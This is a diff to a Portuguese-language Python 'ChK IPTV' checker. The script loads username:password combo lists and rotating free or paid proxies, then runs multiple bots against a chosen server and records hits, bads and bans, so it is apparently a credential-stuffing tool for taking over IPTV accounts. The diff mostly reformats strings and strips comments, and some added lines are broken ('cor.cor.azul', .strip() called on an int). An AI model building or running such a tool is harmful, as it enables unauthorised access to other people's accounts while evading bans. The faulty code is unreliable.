+                print("\n{}Digite o seu separador personalizado:{}".format(cor.amarelo, cor.reset))
+                novo_separador = input("{}  {} >>> {}".format(
+                    cor.verde,
+                    t('responses.response'),
+                    cor.reset
+                )).strip()
                 config["category_settings"]["join_separator"] = novo_separador.strip()
                 config["category_settings"]["decoracao_style"] = "normal"
             else:
-                print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                 time.sleep(2)
                 continue
 
@@ -1592,7 +1560,7 @@ def configurar_categoria(config, t):
             break
         
         else:
-            print(f"{cor.vermelho}{t('responses.invalid_option', 'Opção inválida!')}{cor.reset}")
+            print("{}{}{}".format(cor.vermelho, t('responses.invalid_option', 'Opção inválida!'), cor.reset))
             time.sleep(1)
             continue
 
@@ -1601,9 +1569,9 @@ def configurar_categoria(config, t):
 
 def selecionar_busca_categorias(t):
     """Exibe um menu para o usuário escolher quais categorias buscar."""
-    print(f'\n  {cor.ciano}{"=" * 42}{cor.reset}')
-    print(f"  {cor.atention}{t('questions.show_categories', 'Quais categorias você quer que apareça nos hits?')}{cor.reset}")
-    print(f'  {cor.ciano}{"=" * 42}{cor.reset}\n')
+    print("\n  {}{}{}".format(cor.ciano, "=" * 45, cor.reset))
+    print("  {}{}{}".format(cor.atention, t('questions.show_categories', 'Quais categorias você quer que apareça nos hits?'), cor.reset))
+    print("  {}{}{}\n".format(cor.ciano, "=" * 45, cor.reset))
         
     opcoes = {
         "1": "Nada [ Nenhuma categoria ]",
@@ -1617,66 +1585,43 @@ def selecionar_busca_categorias(t):
     }
 
     for key, value in opcoes.items():
-        # Ajuste no espaçamento para alinhar
+
         if len(key) == 1:
-            print(f"     {cor.azul}{key}» {value}{cor.reset}")
+            print("     {}{}» {}{}".format(cor.azul, key, value, cor.reset))
         else:
-            print(f"    {cor.azul}{key}» {value}{cor.reset}")
+            print("    {}{}» {}{}".format(cor.azul, key, value, cor.reset))
         
-    print(f'\n  {cor.ciano}{"=" * 42}{cor.reset}')
+    print("\n  {}{}{}".format(cor.ciano, "=" * 45, cor.reset))
 
     while True:
-        escolha = input(f"\n  {cor.verde}{t('responses.response', '>>> ')} {cor.reset}").strip()
+        escolha = input("\n  {}{} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         if escolha in opcoes:
             return escolha
         else:
-            print(f"\n  {cor.vermelho}{t('responses.invalid_option', 'Opção inválida!')}{cor.reset}")
+            print("\n  {}{}{}".format(cor.vermelho, t('responses.invalid_option', 'Opção inválida!'), cor.reset))
 
 
-def selecionar_idioma():
-    """Permite ao usuário escolher um idioma"""
-    idiomas = listar_idiomas_disponiveis()
-    
-    if not idiomas:
-        print(f"{cor.vermelho}Nenhum arquivo de idioma encontrado na pasta '{LANG_DIR}/'!{cor.reset}")
-        return "pt"
-    
-    print(f"\n{cor.ciano}Idiomas disponíveis:{cor.reset}")
-    for idx, idioma in enumerate(idiomas, 1):
-        print(f"{cor.azul}{idx}. {idioma}{cor.reset}")
-    
-    while True:
-        try:
-            escolha = int(input(f"{cor.verde}Selecione >> {cor.reset}")) - 1
-            if 0 <= escolha < len(idiomas):
-                return idiomas[escolha]
-        except:
-            pass
-        print(f"{cor.vermelho}Seleção inválida!{cor.reset}")
-
-# ==============================================
-# FUNÇÃO PRINCIPAL
-# ==============================================
 def main():
     proxies = []
     tipo_proxy = None
     config = carregar_configuracoes()
     t = criar_t(config)
 
-    # Se ainda não escolheu sistema operacional
     if not config.get("sistema_operacional"):
         config["sistema_operacional"] = escolher_sistema_operacional(config, t)
         config["configurado"] = True
         salvar_configuracao(config)
 
-    # Se ainda não escolheu idioma
     if not config.get("idioma"):
         banner(config, t)
-        print(f"\n  {cor.amarelo}Idioma não configurado. Selecione o idioma:{cor.reset}")
+        print("\n  {}Idioma não configurado. Selecione o idioma:{}".format(cor.amarelo, cor.reset))
         config["idioma"] = selecionar_idioma()
         salvar_configuracao(config)
 
-    # Menu principal
     while True:
         escolha = mostrar_menu_principal(config, t)
         if escolha == "1":
@@ -1684,35 +1629,36 @@ def main():
         elif escolha == "2":
             mostrar_menu_configuracoes(config, t)
 
-    # Perguntar o host do servidor
     banner(config, t)
-    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
-    print(f"  {cor.atention}{t("questions.server_host")}{cor.reset}")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
-    server = input(f"{cor.verde}  {t("responses.response")} >>> {cor.reset}")
+    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
+    print("  {}{}{}".format(cor.atention, t("questions.server_host"), cor.reset))
+    print("  {}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
+    server = input("\n  {}{} >>> {}".format(
+        cor.verde,
+        t('responses.response'),
+        cor.reset
+    )).strip()
     server = limpar_host(server)
     if not server:
-        print(f"{cor.vermelho}\n  {t("responses.invalid_host")}{cor.reset}")
+        print("{}\n  {}{}".format(cor.vermelho, t("responses.invalid_host"), cor.reset))
         return
 
     banner(config, t)
-    # Resto do código
+
     sistema_operacional = config["sistema_operacional"]
     caminho_base = determinar_caminho_base(sistema_operacional)
     
     if not caminho_base:
-        print(f"{cor.vermelho}  {t('responses.system_not_suported')}{cor.reset}")
+        print("{}  {}{}".format(cor.vermelho, t('responses.system_not_suported'), cor.reset))
         return
 
-    # Define os caminhos das pastas
     pasta_combo = os.path.join(caminho_base, "Combo")
     pasta_proxy = os.path.join(caminho_base, "Proxy")
     pasta_hits = os.path.join(caminho_base, "Hits")
 
-    # Criar pastas se não existirem
     for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
         if not os.path.exists(pasta):
-            print(f"{cor.amarelo}  {t('responses.creating_folder_combo')} {pasta}{cor.reset}")
+            print("{}  {} {}{}".format(cor.amarelo, t('responses.creating_folder_combo'), pasta, cor.reset))
             os.makedirs(pasta)
 
     combos = []
@@ -1722,17 +1668,17 @@ def main():
         resultado_combo = escolher_arquivo(pasta_combo, t, tipo="combo", config=config)
 
         if not resultado_combo:
-            print(f"{cor.vermelho}Nenhum combo selecionado. Encerrando...{cor.reset}")
+            print("{}Nenhum combo selecionado. Encerrando...{}".format(cor.vermelho, cor.reset))
             return
 
         if isinstance(resultado_combo, list):
             combos = resultado_combo
             arquivo_combo = "ONLINE COMBO API'S"
-            print(f"{cor.verde}{len(combos)} combos carregados da API online.{cor.reset}")
-            break # Sai do loop se combos online foram carregados com sucesso
+            print("{}{} combos carregados da API online.{}".format(cor.verde, len(combos), cor.reset))
+            break
         else:
             arquivo_combo = resultado_combo
-            print(f"{cor.ciano}Carregando combos do arquivo local: {os.path.basename(arquivo_combo)}{cor.reset}")
+            print("{}Carregando combos do arquivo local: {}{}".format(cor.ciano, os.path.basename(arquivo_combo), cor.reset))
             try:
                 linhas_invalidas = 0
                 with open(arquivo_combo, 'r', encoding='utf-8') as f:
@@ -1745,82 +1691,120 @@ def main():
                             linhas_invalidas += 1
 
                 if linhas_invalidas > 0:
-                    print(f"{cor.amarelo}{linhas_invalidas} linhas inválidas foram removidas do combo.{cor.reset}")
+                    print("{}{} linhas inválidas foram removidas do combo.{}".format(cor.amarelo, linhas_invalidas, cor.reset))
                 
                 if combos:
-                    break # Sai do loop se combos locais foram carregados com sucesso
+                    break
                 else:
-                    print(f"{cor.vermelho}Nenhum combo válido encontrado no arquivo local. Tente novamente.{cor.reset}")
+                    print("{}Nenhum combo válido encontrado no arquivo local. Tente novamente.{}".format(cor.vermelho, cor.reset))
 
             except FileNotFoundError:
-                print(f"{cor.vermelho}Erro: O arquivo de combo '{arquivo_combo}' não foi encontrado. Tente novamente.{cor.reset}")
+                print("{}Erro: O arquivo de combo '{}' não foi encontrado. Tente novamente.{}".format(cor.vermelho, arquivo_combo, cor.reset))
             except Exception as e:
-                print(f"{cor.vermelho}Erro ao ler o arquivo de combo: {e}. Tente novamente.{cor.reset}")
+                print("{}Erro ao ler o arquivo de combo: {}. Tente novamente.{}".format(cor.vermelho, e, cor.reset))
 
-    # Perguntar se deseja usar proxy
     banner(config, t)
-    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
-    print(f"  {cor.atention}{t("questions.confirm_proxy")}{cor.reset}")
-    print(f"  {cor.azul}[1] {t("questions.yes")}\n  [2] {t("questions.no")}")
-    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
-    usar_proxy = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")
+    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
+    print("  {}{}{}".format(cor.atention, t("questions.confirm_proxy"), cor.reset))
+    print("  {}[1] {}\n  [2] {}".format(cor.azul, t("questions.yes"), t("questions.no")))
+    print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
+    usar_proxy = input("\n  {}{} >>> {}".format(
+        cor.verde,
+        t('responses.response'),
+        cor.reset
+    )).strip()
     if usar_proxy not in ["1", "2"]:
-        print(f"\n  {cor.vermelho}{t("questions.error_question_proxy")}{cor.reset}")
+        print("\n  {}{}{}".format(cor.vermelho, t("questions.error_question_proxy"), cor.reset))
         return
 
     if usar_proxy == "1":
         banner(config, t)
-        print(f"\n{cor.ciano}Deseja usar proxy paga ou grátis?{cor.reset}")
-        print(f"{cor.azul}[1] Proxy Grátis (sem usuário/senha){cor.reset}")
-        print(f"{cor.azul}[2] Proxy Paga (com usuário/senha){cor.reset}")
-        tipo_acesso_proxy = input(f"{cor.verde}>>> {cor.reset}").strip()
+        print("\n{}Deseja usar proxy paga ou grátis?{}".format(cor.ciano, cor.reset))
+        print("{}[1] Proxy Grátis (sem usuário/senha){}".format(cor.azul, cor.reset))
+        print("{}[2] Proxy Paga (com usuário/senha){}".format(cor.azul, cor.reset))
+        tipo_acesso_proxy = input("{}  {} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
 
-        formato_paga = None # Inicializa a variável
+        formato_paga = None
 
         if tipo_acesso_proxy == "1":
-            # Proxy grátis
+
             banner(config, t)
-            
-            # AQUI ESTÁ A MUDANÇA PRINCIPAL
+
             retorno_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy", config=config)
 
             if isinstance(retorno_proxy, tuple):
-                # Se for uma tupla, veio da API online
+
                 proxies, tipo_proxy = retorno_proxy
-                arquivo_proxy = "ONLINE_API" # Apenas para referência
+                arquivo_proxy = "ONLINE_API"
             elif retorno_proxy:
-                # Se for uma string, é um caminho de arquivo local
+
                 arquivo_proxy = retorno_proxy
                 try:
                     with open(arquivo_proxy, 'r') as f:
                         proxies = [linha.strip() for linha in f if linha.strip()]
                     
                     banner(config, t)
-                    print(f"\n{cor.atention}  Escolha o tipo da Proxy:{cor.reset}")
-                    print(f"{cor.azul}  [1] HTTP/HTTPS\n  [2] SOCKS4\n  [3] SOCKS5{cor.reset}")
-                    tipo_proxy = int(input(f"{cor.verde}>>> {cor.reset}"))
+                    print("\n{}  Escolha o tipo da Proxy:{}".format(cor.atention, cor.reset))
+                    print("{}  [1] HTTP/HTTPS\n  [2] SOCKS4\n  [3] SOCKS5{}".format(cor.azul, cor.reset))
+                    tipo_proxy = int(input("{}  {} >>> {}".format(
+                        cor.verde,
+                        t('responses.response'),
+                        cor.reset
+                    )))
                 except FileNotFoundError:
-                    print(f"{cor.vermelho}Arquivo de proxy não encontrado!{cor.reset}")
+                    print("{}Arquivo de proxy não encontrado!{}".format(cor.vermelho, cor.reset))
                     return
                 except (ValueError, TypeError):
-                    print(f"{cor.vermelho}Tipo de proxy inválido!{cor.reset}")
+                    print("{}Tipo de proxy inválido!{}".format(cor.vermelho, cor.reset))
                     return
             else:
-                # Nenhuma opção válida escolhida
-                print(f"{cor.vermelho}Nenhuma fonte de proxy selecionada.{cor.reset}")
+
+                print("{}Nenhuma fonte de proxy selecionada.{}".format(cor.vermelho, cor.reset))
                 return
 
         elif tipo_acesso_proxy == "2":
             banner(config, t)
-            print(f"\n{cor.ciano}Deseja digitar os dados da proxy paga ou carregar de um .txt?{cor.reset}")
-            print(f"{cor.azul}[1] Digitar manualmente\n[2] Carregar de um arquivo{cor.reset}")
-            escolha_proxy_paga = input(f"{cor.verde}>>> {cor.reset}").strip()
+            print("\n{}Deseja digitar os dados da proxy paga ou carregar de um .txt?{}".format(cor.ciano, cor.reset))
+            print("{}[1] Digitar manualmente\n[2] Carregar de um arquivo{}".format(cor.azul, cor.reset))
+            escolha_proxy_paga = input("{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            )).strip()
 
             if escolha_proxy_paga == "1":
-                host = input(f"{cor.ciano}Host (ex: rp.scrapegw.com){cor.reset}\n{cor.verde}>>> {cor.reset}")
-                port = input(f"{cor.ciano}Porta (ex: 6060){cor.reset}\n{cor.verde}>>> {cor.reset}")
-                user = input(f"{cor.ciano}Usuário:{cor.reset}\n{cor.verde}>>> {cor.reset}")
-                senha = input(f"{cor.ciano}Senha:{cor.reset}\n{cor.verde}>>> {cor.reset}")
+                host = input("{}Host (ex: rp.scrapegw.com){}\n{}>>>{}".format(
+                    cor.ciano,
+                    cor.reset,
+                    cor.verde,
+                    cor.reset
+                ))
+                port = input("{}Porta (ex: 6060){}\n{}  {} >>> {}".format(
+                    cor.ciano,
+                    cor.reset,
+                    cor.verde,
+                    t('responses.response'),
+                    cor.reset
+                )).strip()
+                user = input("{}Usuário:{}\n{}  {} >>> {}".format(
+                    cor.ciano,
+                    cor.reset,
+                    cor.verde,
+                    t('responses.response'),
+                    cor.reset
+                )).strip()
+                senha = input("{}Senha:{}\n{}  {} >>> {}".format(
+                    cor.ciano,
+                    cor.reset,
+                    cor.verde,
+                    t('responses.response'),
+                    cor.reset
+                )).strip()
+
                 proxies = [f"{host}:{port}:{user}:{senha}"]
                 arquivo_proxy = "PROXY MANUAL PAID"
             elif escolha_proxy_paga == "2":
@@ -1831,52 +1815,59 @@ def main():
                     proxies = [linha.strip() for linha in f if linha.strip()]
                 arquivo_proxy = os.path.basename(arquivo_proxy)
             else:
-                print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+                print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
                 return
 
-            # Pergunta o formato da proxy paga
-            print(f"\n{cor.ciano}Qual é o formato da proxy paga?{cor.reset}")
-            print(f"{cor.azul}[1] hostname:port:username:password")
-            print(f"[2] username:password@hostname:port")
-            print(f"[3] http://username:password@hostname:port{cor.reset}")
-            formato_paga = input(f"{cor.verde}>>> {cor.reset}").strip()
+            print("\n{}Qual é o formato da proxy paga?{}".format(cor.ciano, cor.reset))
+            print("{}[1] hostname:port:username:password".format(cor.cor.azul))
+            print("[2] username:password@hostname:port")
+            print("[3] http://username:password@hostname:port{}".format(cor.reset))
+            formato_paga = input("{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            )).strip()
 
-            # Pergunta o protocolo
-            print(f"\n{cor.ciano}Qual protocolo deseja usar?{cor.reset}")
-            print(f"{cor.azul}[1] HTTP/HTTPS\n[2] SOCKS5{cor.reset}")
-            protocolo_input = input(f"{cor.verde}>>> {cor.reset}").strip()
+            print("\n{}Qual protocolo deseja usar?{}".format(cor.ciano, cor.reset))
+            print("{}[1] HTTP/HTTPS\n[2] SOCKS5{}".format(cor.azul, cor.reset))
+            protocolo_input = input("{}  {} >>> {}".format(
+                cor.verde,
+                t('responses.response'),
+                cor.reset
+            )).strip()
 
             if protocolo_input == "1":
                 tipo_proxy = 1
             elif protocolo_input == "2":
                 tipo_proxy = 3
             else:
-                print(f"{cor.vermelho}Protocolo inválido!{cor.reset}")
+                print("{}Protocolo inválido!{}".format(cor.vermelho, cor.reset))
                 return
 
         else:
-            print(f"{cor.vermelho}Opção inválida!{cor.reset}")
+            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))
             return
 
-    # Perguntar quais categorias buscar
     banner(config, t)
     escolha_categoria = selecionar_busca_categorias(t)
 
-    # Perguntar o número de bots
     try:
         banner(config, t)
-        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
-        print(f"{cor.atention}  {t("questions.number_of_bots")}{cor.reset}")
-        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
-        num_bots = int(input(f"{cor.verde}\n  {t("responses.response")} >>> {cor.reset}"))
+        print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
+        print("{}  {}{}".format(cor.atention, t("questions.number_of_bots"), cor.reset))
+        print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
+        num_bots = int(input("\n  {}{} >>> {}".format(
+            cor.verde,
+            t('responses.response'),
+            cor.reset
+        )).strip()
         if num_bots < 1:
-            print(f"{cor.vermelho}{t("responses.invalid_number_of_bots")}{cor.reset}")
+            print("{}{}{}".format(cor.vermelho, t("responses.invalid_number_of_bots"), cor.reset))
             return
     except ValueError:
-        print(f"{cor.vermelho}{t("responses.invalid_input_number")}{cor.reset}")
+        print("{}{}{}".format(cor.vermelho, t("responses.invalid_input_number"), cor.reset))
         return
 
-    # Configurar headers personalizados
     headers = {
         "Host": server,
         "Referer": f"http://{server}/",
@@ -1888,17 +1879,14 @@ def main():
         "Pragma": "no-cache"
     }
 
-    # Formatar nome do arquivo de resultados
     nome_arquivo = f"ChK IPTV [ {server.replace(':', '_')} ].txt"
     caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)
 
-    # Contadores de hits, bads e bans
     hits = 0
     bads = 0
     bans = 0
     total_linhas = len(combos)
 
-    # Processar combos com múltiplos bots
     hits, bads, bans = processar_combos(
         combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans,
         total_linhas, caminho_arquivo, usar_proxy,
@@ -1906,13 +1894,12 @@ def main():
         escolha_categoria, formato_paga if usar_proxy == "1" and tipo_acesso_proxy == "2" else None
     )
 
-    # Exibir resumo final simplificado
-    print(f"\n{cor.magenta}{t("menu.exit_message_1")}{cor.reset}")
+    print("\n{}{}{}".format(cor.magenta, t("menu.exit_message_1"), cor.reset))
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
-        print(f"\n{cor.vermelho}  CRITICAL ERROR: {e}{cor.reset}")
+        print("\n{}  CRITICAL ERROR: {}{}".format(cor.vermelho, e, cor.reset))
         traceback.print_exc()
         input("Pressione Enter para sair...")
